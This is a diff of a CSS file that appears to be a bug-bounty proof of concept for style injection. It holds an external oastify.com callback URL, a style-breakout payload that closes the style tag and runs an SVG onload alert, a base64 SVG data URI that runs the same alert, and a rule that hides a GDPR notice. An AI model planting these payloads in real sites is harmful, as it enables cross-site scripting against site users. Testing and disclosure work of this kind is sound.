@@ -1,13 +1,14 @@
-div  {
-    background-image: url("https://4afa8ydm629afdm1alvb2sbi49a0yrqff.oastify.com/poc.svg");
+div {
+    background-image: url("https://oumusix6qmtuzx6lu5fvmcv2otukibbz0.oastify.com/poc.svg");
     background-color: #cccccc;
 }
+
 body {
-	background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
-	background-color: #FF0000;
- 
+    background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxpbWFnZSBvbmxvYWQ9ImFsZXJ0KGRvY3VtZW50LmRvbWFpbikiPjwvaW1hZ2U+PC9zdmc+");
+    background-color: #FF0000;
 }
+
 ._2brsq-_-_-client-components-gdpr-notification--notification-wrapper {
-	background-color: red;
-	visibility: hidden;
+    background-color: red;
+    visibility: hidden;
 }
